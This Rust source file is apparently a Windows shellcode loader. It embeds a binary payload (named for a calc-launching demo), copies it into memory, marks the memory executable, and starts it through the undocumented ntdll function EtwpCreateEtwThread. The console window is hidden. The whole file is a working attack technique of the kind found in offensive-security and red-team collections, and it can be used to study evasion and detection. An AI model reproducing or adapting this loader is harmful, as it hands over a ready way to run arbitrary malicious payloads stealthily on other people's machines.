#![windows_subsystem = "windows"]

use std::ffi::c_void;
use std::mem::transmute;
use std::ptr::{copy, null};
use windows_sys::Win32::Foundation::{FALSE, HANDLE, WAIT_FAILED};
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::WaitForSingleObject;

const SHELLCODE: &[u8] = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
const SIZE: usize = SHELLCODE.len();

#[cfg(target_os = "windows")]
fn main() {
    let mut old = PAGE_READWRITE;

    unsafe {
        let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr());
        if ntdll == 0 {
            panic!("LoadLibraryA failed!");
        }

        let fn_etwp_create_etw_thread = GetProcAddress(ntdll, b"EtwpCreateEtwThread\0".as_ptr());

        let etwp_create_etw_thread: extern "C" fn(*mut c_void, isize) -> HANDLE =
            transmute(fn_etwp_create_etw_thread);

        let dest = VirtualAlloc(null(), SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if dest.is_null() {
            panic!("VirtualAlloc failed!");
        }

        copy(SHELLCODE.as_ptr(), dest.cast(), SIZE);

        let res = VirtualProtect(dest, SIZE, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            panic!("VirtualProtect failed!");
        }

        let thread = etwp_create_etw_thread(dest, 0);
        if thread == 0 {
            panic!("etwp_create_etw_thread failed!")
        }

        WaitForSingleObject(thread, WAIT_FAILED);
    }
}
